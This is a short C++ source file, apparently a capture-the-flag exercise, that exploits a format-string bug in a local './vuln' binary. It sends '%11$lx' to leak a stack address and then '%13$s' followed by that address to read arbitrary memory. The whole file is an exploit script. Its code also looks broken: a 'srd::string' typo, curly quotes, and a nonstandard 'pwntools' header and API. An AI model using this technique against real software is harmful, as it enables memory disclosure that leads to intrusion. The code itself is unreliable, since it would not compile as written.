//arbitrary read
#include <string>
#include <iostream>
#include <pwntools>

int main(){
using namespace pwn;
Process p{“./vuln”,NULL,0};
p.set_debug(true);
srd::string payload1;
payload1.append(“%11$lx”);
p.sendline(payload1);
std::string vuln_fun_re=p.recv(12);
std::string payload2;
payload2.append(“%13$s123”);
payload2+=p64(hexstr2long(vuln_fun_re));
p.sendline(payload2);
p.recvall();
}